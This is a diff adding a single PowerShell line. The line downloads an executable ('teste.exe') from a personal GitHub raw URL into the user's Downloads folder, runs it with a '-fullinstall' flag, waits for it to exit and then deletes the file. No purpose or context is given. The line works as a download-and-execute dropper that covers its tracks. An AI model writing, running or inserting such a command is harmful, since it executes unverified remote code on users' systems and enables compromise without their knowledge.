@@ -1,0 +1,1 @@
+$d=(New-Object -ComObject Shell.Application).Namespace("shell:Downloads").Self.Path;$f="$d\\teste.exe";iwr https://raw.githubusercontent.com/darkcat888/testeMSC/refs/heads/main/teste.exe -OutFile $f;$p=Start-Process $f -ArgumentList "-fullinstall" -PassThru;$p.WaitForExit();Remove-Item $f;exit
